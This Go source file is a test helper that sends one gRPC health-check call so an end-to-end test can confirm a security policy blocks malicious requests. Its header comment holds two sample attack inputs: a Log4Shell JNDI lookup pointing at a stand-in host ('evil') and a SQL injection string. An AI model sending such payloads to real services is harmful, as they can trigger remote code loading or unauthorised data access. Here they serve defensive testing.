// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

// Command grpchealth makes one gRPC call, grpc.health.v1.Health/Check,
// over HTTP/2 without TLS, and prints the call's status code (OK,
// PermissionDenied, ...). The kind end-to-end test uses it to check that
// gRPC calls pass a policy in block mode, and that one with an attack in
// its metadata is denied (#284), or in its message when the policy
// inspects messages (#275).
//
//	go run ./hack/grpchealth -authority grpc.example.com -metadata 'x-api-key=${jndi:ldap://evil/a}' 127.0.0.1:18091
//	go run ./hack/grpchealth -authority grpc.example.com -service "1' OR '1'='1' -- " 127.0.0.1:18091
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

func main() {
	authority := flag.String("authority", "", "the :authority to send")
	service := flag.String("service", "", "the HealthCheckRequest's service: text in the message")
	var md []string
	flag.Func("metadata", "a `key=value` pair to send as metadata (repeatable)", func(s string) error {
		k, v, ok := strings.Cut(s, "=")
		if !ok {
			return fmt.Errorf("%q is not key=value", s)
		}
		md = append(md, k, v)
		return nil
	})
	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, "usage: grpchealth [-authority HOST] [-service NAME] [-metadata KEY=VALUE]... HOST:PORT")
		flag.PrintDefaults()
	}
	flag.Parse()
	if flag.NArg() != 1 {
		flag.Usage()
		os.Exit(2)
	}
	code, err := check(flag.Arg(0), *authority, *service, md)
	if err != nil {
		fmt.Fprintln(os.Stderr, "grpchealth:", err)
		os.Exit(1)
	}
	fmt.Println(code)
}

func check(target, authority, service string, md []string) (string, error) {
	opts := []grpc.DialOption{grpc.WithTransportCredentials(insecure.NewCredentials())}
	if authority != "" {
		opts = append(opts, grpc.WithAuthority(authority))
	}
	conn, err := grpc.NewClient("passthrough:///"+target, opts...)
	if err != nil {
		return "", err
	}
	defer func() { _ = conn.Close() }()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	ctx = metadata.AppendToOutgoingContext(ctx, md...)
	_, err = grpc_health_v1.NewHealthClient(conn).Check(ctx, &grpc_health_v1.HealthCheckRequest{Service: service})
	st, ok := status.FromError(err)
	if !ok {
		return "", err
	}
	// A status the proxy made up says why.
	if st.Code() != 0 && st.Message() != "" {
		fmt.Fprintln(os.Stderr, "grpchealth:", st.Message())
	}
	return st.Code().String(), nil
}
